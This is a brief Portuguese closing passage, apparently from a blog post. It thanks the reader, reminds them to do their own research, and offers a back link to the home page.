Espero que você tenha gostado deste texto e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **

<a href="/">Voltar</a>
